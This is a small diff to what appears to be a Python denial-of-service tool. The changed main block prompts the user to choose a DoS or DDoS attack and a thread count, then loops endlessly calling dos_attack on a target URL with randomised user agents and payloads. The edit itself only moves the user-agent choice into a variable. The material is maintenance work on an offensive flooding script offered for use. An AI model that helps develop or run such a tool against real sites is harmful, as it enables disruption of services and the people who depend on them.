@@ -105,7 +105,8 @@ if __name__ == "__main__":
             if attack_type == "1":
                 num_threads = int(input("Enter number of threads for DoS attack: "))
                 while True:
-                    dos_attack(target_url, random.choice(user_agents), random.choice(payloads))
+                    user_agent = random.choice(user_agents)
+                    dos_attack(target_url, user_agent, random.choice(payloads))
             
             elif attack_type == "2":
                 num_threads = int(input("Enter number of threads for DDoS attack: "))
